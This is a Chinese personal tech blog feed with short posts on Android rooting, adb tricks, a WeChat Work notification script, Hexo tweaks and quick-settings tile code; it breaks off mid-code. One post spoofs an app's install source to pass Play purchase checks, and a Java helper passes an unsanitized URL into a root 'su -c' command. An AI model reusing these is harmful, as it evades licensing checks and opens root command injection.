        <content type="html"><![CDATA[<p>最近 Server酱 公众号推文说微信模板通知要在4月底下线，到时要更换到 Turbo版 才能正常推送通知，不过 Turbo版 的免费次数有点少，感觉不太够用，还是要找点别的方法替代  </p><a id="more"></a>  <p>之前用Server酱时还同时用着<a href="https://www.coolapk.com/apk/top.tdtt.news" target="_blank" rel="noopener">消息接收</a>，这个在小米手机上使用会走系统通知，mipush的显示，无法使用长文本，和其他应用的狗狗昂、广告通知混在一起也不方便查看  </p><p>刚刚在酷安上看到<a href="https://www.coolapk.com/feed/25045272?shareKey=Mzk5YzhkOWNkOWVhNjAzNDcwYjA~&shareUid=778415&shareFrom=com.coolapk.market_11.0.1" target="_blank" rel="noopener">MrZhang1899</a>的动态，利用企业微信推送信息，和Turbo版Server酱一样，不过要自己搭建，<a href="https://github.com/MrZhang1899/WxWork_Push" target="_blank" rel="noopener">Github</a>，整理他在git上的代码做了个控制台微信通知，放在老毛子固件上/Github Actions上信息通知还不错  </p><p>代码(控制台程序)  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">企业微信配置</span></span><br><span class="line">corpid=""</span><br><span class="line">secret=""</span><br><span class="line">agentid=1000002</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">要推送的信息</span></span><br><span class="line">msg="微信通知"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">获取access_token</span></span><br><span class="line">url="https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=$&#123;corpid&#125;&amp;corpsecret=$&#123;secret&#125;"</span><br><span class="line"></span><br><span class="line">result=$(curl -s $url)</span><br><span class="line">tmp=$&#123;result#*access_token&#125;</span><br><span class="line">tmp=$&#123;tmp#*\"&#125;</span><br><span class="line">tmp=$&#123;tmp#*\"&#125;</span><br><span class="line">token=$&#123;tmp%%\"*&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">推送到微信</span></span><br><span class="line">jsonData="&#123;\"touser\":\"@all\",\"msgtype\":\"text\",\"agentid\":$&#123;agentid&#125;,\"text\":&#123;\"content\":\"$&#123;msg&#125;\"&#125;&#125;"</span><br><span class="line">messageUrl="https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=$&#123;token&#125;"</span><br><span class="line">curl -L -s $messageUrl -X POST -d $jsonData</span><br></pre></td></tr></table></figure><p>其中 <code>corpid</code> (企业ID)、 <code>secret</code> 、 <code>agentid</code> 填写在企业微信申请到的信息  </p><p><a href="https://work.weixin.qq.com/wework_admin/frame#profile" target="_blank" rel="noopener">登录企业微信</a>，在企业微信里点击我的企业，最下面就是企业ID，secret 和 agentid 在 应用管理 - 创建应用就能看到  </p><p> <strong>记得在手机微信的企业微信设置里打开接收企业消息</strong>  </p><p>为了在老毛子固件路由器上能用，代码中没有用其他程序解析json，而是用截取字符串的方式代替  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>酷比魔方iPlay40解锁</title>
      <link href="/2021/ku-bi-mo-fang-iplay40-jie-suo/"/>
      <url>/2021/ku-bi-mo-fang-iplay40-jie-suo/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;在酷比魔方官方人员在酷安宣传“可解锁搞机”、“刷机保修”下种草了iPlay40，平板总体还不错，一个大屏娱乐板，官方也早早的放出了解锁文件，愉快的解锁bootloader，刷magisk，一气呵成  </p><a id="more"></a>  <p>&ensp;&ensp;年后官方好像换了个人在酷安，之前分享的文件也删了，于是有了这篇简单的解锁汇总，官方分享的文件的同时也附有文档说明，请以官网文档为准  </p><blockquote><p>需提前安装设备驱动、adb/fastboot工具  </p></blockquote><h5 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h5><p>&ensp;&ensp;平板安装 <code>SpreadTrumTools</code> 输入序列号点击 <code>GENERATE</code> 获取 <code>signature.bin</code> 文件<br>序列号在平板背面ALLDOCUBE logo下方，包装盒标签上也有，T1020S开头的那串字符  </p><p>&ensp;&ensp;也可以使用以下命令获取</p><pre><code class="bash">adb shell getprop ro.serialno</code></pre><p>&ensp;&ensp;获取到signature.bin文件后将其拷到电脑  </p><p>&ensp;&ensp;进入fastboot</p><pre><code class="bash">adb reboot bootloader</code></pre><p>&ensp;&ensp;执行以下命令解锁  </p><pre><code class="bash">fastboot oem get_identifier_tokenfastboot flashing unlock_bootloader signature.bin</code></pre><p>&ensp;&ensp;使用音量上下键选择确定解锁，解锁会抹掉平板数据，请提前备份，解锁需要15分钟左右，需要等待较长的时间</p><p>&ensp;&ensp;解锁完成使用reboot重启</p><pre><code class="bash">fastboot reboot</code></pre><hr><h5 id="获取root"><a href="#获取root" class="headerlink" title="获取root"></a>获取root</h5><p>&ensp;&ensp;进入fastboot</p><pre><code class="bash">adb reboot bootloader</code></pre><p>&ensp;&ensp;刷magisk (20201127文件夹)</p><pre><code class="bash">fastboot flash vbmeta vbmeta_signed.imgfastboot flash boot magisk_patched.img</code></pre><p>&ensp;&ensp;回官方boot (official文件夹)</p><pre><code class="bash">fastboot flash vbmeta vbmeta-sign.imgfastboot flash boot boot.img</code></pre><p>&ensp;&ensp;重启</p><pre><code class="bash">fastboot reboot</code></pre><p>&ensp;&ensp;关于boot文件，可以使用官方人员修补好的boot文件，也可以自行提取修补</p><h5 id="Boot文件提取"><a href="#Boot文件提取" class="headerlink" title="Boot文件提取"></a>Boot文件提取</h5><p>&ensp;&ensp;下载刷机工具和固件，固件为展讯的 <code>pac</code> 格式(紫光展锐)  </p><p>&ensp;&ensp;使用刷机工具 <code>ResearchDownload</code> 选择pac格式的固件，等待读条完成  </p><p>&ensp;&ensp;完成后会在 <code>ImageFiles</code> 目录下生成一个 <code>_DownloadFiles</code> 开头的目录，里面储存的是解包后的固件  </p><p>&ensp;&ensp;找到boot.img即可  </p><p>&ensp;&ensp;将boot文件发送到手机使用magisk修补会得到magisk_patche_xxxx.img的文件，刷入即可</p><p>ps.博主修补完boot刷入并不能开机，原因未知，仅提供这个方法供参考</p><p>文件下载：百度盘链接<a href="https://pan.baidu.com/s/1qHDCSkepUNuI_H3aR9ujdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1qHDCSkepUNuI_H3aR9ujdQ</a> 提取码:7b19 </p><p><a href="https://www.51cube.com/service/iplay40-t1020s-firmware-download" target="_blank" rel="noopener">官网刷机工具、固件下载</a>  </p><p><a href="http://juseblog.com/doku.php?id=android:iplay-40-unlock-and-magisk" target="_blank" rel="noopener">图文版（JUSEBLOG）</a> | <a href="https://www.coolapk.com/feed/25551058?shareKey=ZmE4NTVmYmM5YzJkNjA4MjczOTk~&shareUid=778415&shareFrom=com.coolapk.market_11.1.5-beta3" target="_blank" rel="noopener">酷安</a></p><p>刷机有风险，玩机需谨慎<br>本博文仅提供刷机解锁思路<br>因自己操作不当造成的设备变砖自行负责  </p><p>ps.官方固件内包含使用说明</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>免电脑执行adb</title>
      <link href="/2021/mian-dian-nao-zhi-xing-adb/"/>
      <url>/2021/mian-dian-nao-zhi-xing-adb/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;安卓的一些玩机技巧/操作需要用到root或adb  </p><a id="more"></a>  <p>&ensp;&ensp;一些设备的root门槛拦住了一大批人，adb反而更容易使用，谷歌提供的adb工具并不友好，需要命令行操作，有大佬做了方便的图形化工具  </p><p>&ensp;&ensp;推荐两个电脑端工具： “搞机工具箱” 和 “<a href="https://atmb.top/" target="_blank" rel="noopener">秋之盒</a>“ ，秋之盒官网下载即可，搞机工具箱需前往 <a href="http://www.coolapk.com/u/630380" target="_blank" rel="noopener">晨钟酱</a> 主页自行搜索下载</p><hr><p>关于免电脑操作：  </p><p>&ensp;&ensp;方案一：使用小黑屋开发者的 <a href="https://adb.http.gs/" target="_blank" rel="noopener">Adb 在线执行器</a> ，需要有两部手机，一根c to c的线或者OTG转接头+数据线  </p><p>&ensp;&ensp;方案二：使用 飞智小游 硬件，硬件需要自行购买，安装”飞智小游助手”app，填写想要执行的命令，连接硬件和手机即可<br>&ensp;&ensp;飞智小游助手app酷安已下架，可以在这里<a href="motionelf.zip">下载</a> ，app内只需填写 <code>adb shell</code> 后面的命令  </p><p>&ensp;&ensp;方案三：在Magisk中安装”ADB &amp; Fastboot for Android NDK”模块，需要两部手机并且其中一部已root，使用时连接两部手机， <code>su</code>  <code>adb devices</code> 即可和Win下adb一样操作</p><hr><p>&ensp;&ensp;当然，还有些骚操作免电脑，当你拥有一台刷了自定义估计的路由器：<a href="https://www.coolapk.com/feed/9932443?shareKey=Y2JiNjQyMjAzZTc1NjAyMTAzNTk~&shareUid=778415&shareFrom=com.coolapk.market_11.0.1" target="_blank" rel="noopener">酷安动态</a>  </p><p><img src="/img/preloader.gif" data-original="img1.jpg" alt="image"><br><img src="/img/preloader.gif" data-original="img2.jpg" alt="image"><br><img src="/img/preloader.gif" data-original="img3.jpg" alt="image">  </p><p>&ensp;&ensp;图源上动态，现在的路由器基本上都是低配的Linux，可玩性很高<img src="/img/preloader.gif" data-original="/coolapk-emotion/65_coshuaji.gif" alt="cos滑稽">  </p><hr><p>&ensp;&ensp;对于安卓11，不用这么麻烦，因为谷歌已经支持网络adb，<a href="https://www.coolapk.com/apk/moe.shizuku.privileged.api" target="_blank" rel="noopener">Shizuku</a> 这种类型的软件已经支持网络adb自激活，无需其它操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓通知栏磁贴</title>
      <link href="/2021/an-zhuo-tong-zhi-lan-ci-tie/"/>
      <url>/2021/an-zhuo-tong-zhi-lan-ci-tie/</url>
      
        <content type="html"><![CDATA[<p>通知栏磁贴，安卓7引入的，可以快速指定操作  </p><a id="more"></a>  <p>直接上代码  </p><p>在AndroidManifest.xml中添加  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:name</span>=<span class="string">".TitleService"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:icon</span>=<span class="string">"@drawable/title"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:permission</span>=<span class="string">"android.permission.BIND_QUICK_SETTINGS_TILE"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.service.quicksettings.action.QS_TILE"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleService</span> <span class="keyword">extends</span> <span class="title">TileService</span> </span>&#123;</span><br><span class="line"> <span class="comment">//添加磁贴时调用</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTileAdded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onTileAdded();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//移除磁贴时调用</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTileRemoved</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onTileRemoved();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//点击事件</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onClick();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//只有添加后才调用</span></span><br><span class="line"> <span class="comment">//通知栏下拉</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartListening</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onStartListening();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//通知栏关闭</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStopListening</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onStopListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//设置磁贴颜色</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setQuickSettingColor</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">//更改成非活跃状态(灰色)</span></span><br><span class="line">  getQsTile().setState(Tile.STATE_ACTIVE);</span><br><span class="line">        <span class="comment">//更改成活跃状态(白色)</span></span><br><span class="line">  <span class="comment">//getQsTile().setState(Tile.STATE_INACTIVE);</span></span><br><span class="line">  getQsTile().updateTile();<span class="comment">//更新Tile</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要长按磁贴拉起指定Activity而不是应用设置，在想要拉起的Activity中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.service.quicksettings.action.QS_TILE_PREFERENCES"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以考虑添加点击后收起通知栏</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">collapseStatusBar</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="meta">@SuppressLint</span>(<span class="string">"WrongConstant"</span>) Object statusBarManager = context.getSystemService(<span class="string">"statusbar"</span>);</span><br><span class="line">  Method collapse;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.JELLY_BEAN)&#123;</span><br><span class="line">   <span class="keyword">assert</span> statusBarManager != <span class="keyword">null</span>;</span><br><span class="line">   collapse = statusBarManager.getClass().getMethod(<span class="string">"collapse"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">assert</span> statusBarManager != <span class="keyword">null</span>;</span><br><span class="line">   collapse = statusBarManager.getClass().getMethod(<span class="string">"collapsePanels"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  collapse.invoke(statusBarManager);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception localException) &#123;</span><br><span class="line">  localException.printStackTrace();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收起通知栏需要申请权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.EXPAND_STATUS_BAR"</span> /&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>live2d看板娘</title>
      <link href="/2021/live2d-kan-ban-niang/"/>
      <url>/2021/live2d-kan-ban-niang/</url>
      
        <content type="html"><![CDATA[<p>博客搭好后一直用着miku作为看板娘，Hexo博客使用live2d看板娘也很简单  </p><a id="more"></a>  <p>执行npm命令就能安装  </p><pre><code class="bash">npm install --save hexo-helper-live2d</code></pre><p>装好后就是找好看的模型了，最近发现一个宝藏站<a href="https://mx.paul.ren/" target="_blank" rel="noopener">梦象</a> ，里面很多模型供下载使用，配置方法上面也有   </p><p>挺喜欢这个<a href="https://mx.paul.ren/model/2017-snow-miku.html" target="_blank" rel="noopener">2017 雪初音（Snow Miku）</a>，怕github pages那加载速度，就换了个22娘，也很棒  </p><p>不光网站能用，桌面上也能用看板娘，安装PPet即可，<a href="https://github.com/zenghongtu/PPet" target="_blank" rel="noopener">https://github.com/zenghongtu/PPet</a>  </p><p>Snow Miku的也留一下吧，以后再其它html文件里想用时直接过来复制就行  </p><pre><code class="html"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">L2Dwidget.init({<span class="string">"pluginRootPath"</span>:<span class="string">"live2dw/"</span>,<span class="string">"pluginJsPath"</span>:<span class="string">"lib/"</span>,<span class="string">"pluginModelPath"</span>:<span class="string">"assets/"</span>,<span class="string">"tagMode"</span>:<span class="literal">false</span>,<span class="string">"debug"</span>:<span class="literal">false</span>,<span class="string">"model"</span>:{<span class="string">"jsonPath"</span>:<span class="string">"https://gddhy.net/live2dw/snow_miku/model.json"</span>},<span class="string">"display"</span>:{<span class="string">"position"</span>:<span class="string">"right"</span>,<span class="string">"width"</span>:<span class="number">300</span>,<span class="string">"height"</span>:<span class="number">300</span>},<span class="string">"mobile"</span>:{<span class="string">"show"</span>:<span class="literal">true</span>},<span class="string">"log"</span>:<span class="literal">false</span>});</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></code></pre><p>之前用的Miku  </p><pre><code class="html"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">L2Dwidget.init({<span class="string">"pluginRootPath"</span>:<span class="string">"live2dw/"</span>,<span class="string">"pluginJsPath"</span>:<span class="string">"lib/"</span>,<span class="string">"pluginModelPath"</span>:<span class="string">"assets/"</span>,<span class="string">"tagMode"</span>:<span class="literal">false</span>,<span class="string">"debug"</span>:<span class="literal">false</span>,<span class="string">"model"</span>:{<span class="string">"jsonPath"</span>:<span class="string">"https://cdn.jsdelivr.net/gh/gddhy/gddhy.github.io/live2dw/assets/assets/miku.model.json"</span>},<span class="string">"display"</span>:{<span class="string">"position"</span>:<span class="string">"right"</span>,<span class="string">"width"</span>:<span class="number">150</span>,<span class="string">"height"</span>:<span class="number">300</span>},<span class="string">"mobile"</span>:{<span class="string">"show"</span>:<span class="literal">true</span>},<span class="string">"log"</span>:<span class="literal">false</span>});</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></code></pre><p>添加到html文件 <code>&lt;/body&gt;</code> 前即可使用  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异步加载CSS</title>
      <link href="/2021/yi-bu-jia-zai-css/"/>
      <url>/2021/yi-bu-jia-zai-css/</url>
      
        <content type="html"><![CDATA[<p>最近按照<a href="https://blog.csdn.net/qq_41186928/article/details/105193552" target="_blank" rel="noopener">hexo博客yilia主题下复制代码块功能-辛猿毅码</a> 给博客加了代码块复制  </p><a id="more"></a>  <p>复制按钮前面的图标用的<a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener">Font Awesome</a>图标库，并不是每一篇博客都需要复制代码，为了不影响博客加载速度，想到了异步加载这个图标库</p><p>couldfare中有个异步加载js，国内速度问题体验并不好，就找到没去couldfare里面看，找到了这么个方法</p><hr><p>利用 link 上的 media 属性，将它设置为和用户当前浏览器环境不匹配的值，比如：media=”print”，甚至可以设置为一个完全无效的值 media=”jscourse” 之类的。</p><p>这样一来，浏览器就会认为这个 CSS 文件优先级非常低，就会在不阻塞的情况下进行加载。但是为了让 CSS 规则生效，最后还是要将 media 值改对才行。所以，这个办法落实到代码就是这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"cssfile.css"</span> <span class="attr">media</span>=<span class="string">"jscourse"</span> <span class="attr">onload</span>=<span class="string">"this.media='all'"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>方法来自<a href="https://www.cnblogs.com/cjx-work/p/8133858.html" target="_blank" rel="noopener">异步加载CSS - cjx_work</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API收集</title>
      <link href="/2021/api-shou-ji/"/>
      <url>/2021/api-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>收集的一些能用到的API  </p><a id="more"></a><p>苏宁网络时间<br><a href="http://quan.suning.com/getSysTime.do" target="_blank" rel="noopener">http://quan.suning.com/getSysTime.do</a></p><p>腾讯DNSPod DNS (接域名)<br><a href="http://119.29.29.29/d?dn=gddhy.net" target="_blank" rel="noopener">http://119.29.29.29/d?dn=gddhy.net</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓QQ使用系统通知音</title>
      <link href="/2021/qq-tong-zhi-she-zhi/"/>
      <url>/2021/qq-tong-zhi-she-zhi/</url>
      
        <content type="html"><![CDATA[<p>QQ不知道从那个版本开始，不能在QQ里直接设置使用系统通知铃声了  </p><a id="more"></a>  <p>解决：</p><ul><li>关闭QQ声音<br>QQ设置/消息通知/消息通知设置/声音</li><li>系统通知<br>在应用管理/QQ/通知，找到QQ的通知渠道，将声音打开</li></ul><p>使用系统通知后不能通过媒体音量控制QQ通知音量，通知音量与短信/微信通知音量一致</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪装应用安装来源</title>
      <link href="/2021/wei-zhuang-ying-yong-an-zhuang-lai-yuan/"/>
      <url>/2021/wei-zhuang-ying-yong-an-zhuang-lai-yuan/</url>
      
        <content type="html"><![CDATA[<p>部分软件验证play渠道内购时要求软件要从play渠道安装，想要保留数据又不能直接卸载软件，可以使用下方法<a id="more"></a>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm install -i "com.android.vending" -r /sdcard/xxx.apk</span><br></pre></td></tr></table></figure><p> <code>com.android.vending</code> 为play商店包名，可以替换为其他应用包名  </p><ul><li>手机上执行要root  </li></ul><p>简易的apk实现<a href="install-apk.zip">点击下载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo不渲染指定文件</title>
      <link href="/2021/hexo-bu-xuan-ran-zhi-ding-wen-jian/"/>
      <url>/2021/hexo-bu-xuan-ran-zhi-ding-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>在博客目录下的_config.yml 文件中配置skip_render<a id="more"></a>  </p><ul><li><p>指定的单个文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">'CNAME'</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">'404.html'</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">'qr/index.html'</span></span><br></pre></td></tr></table></figure></li><li><p>单个文件夹下指定类型</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">'qr/*.html'</span></span><br></pre></td></tr></table></figure></li><li><p>单个文件夹下全部文件及子目录</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">'qr/**'</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调用内置浏览器打开</title>
      <link href="/2021/open-with/"/>
      <url>/2021/open-with/</url>
      
        <content type="html"><![CDATA[<p>微信(需要root)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.tencent.mm/com.tencent.mm.plugin.webview.ui.tools.WebViewUI -a android.intent.action.VIEW -d https://baidu.com</span><br></pre></td></tr></table></figure><p>命令来自酷安应用WeView  </p><a id="more"></a>  <p>跳转微信内置浏览器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">openWithWeChat</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">"su -c "</span> +</span><br><span class="line">      <span class="string">"am start -n com.tencent.mm/com.tencent.mm.plugin.webview.ui.tools.WebViewUI -a"</span> +</span><br><span class="line">      <span class="string">" android.intent.action.VIEW -d "</span> + url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳转支付宝内置浏览器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">openWithAlipay</span><span class="params">(Context context, String url)</span></span>&#123;</span><br><span class="line">  String data = <span class="string">"intent://platformapi/startapp?saId=10000007&amp;"</span> +</span><br><span class="line">    <span class="string">"qrcode="</span> + Uri.encode(url) + </span><br><span class="line">    <span class="string">"#Intent;"</span> + <span class="string">"scheme=alipayqr;package=com.eg.android.AlipayGphone;end"</span>;</span><br><span class="line">  <span 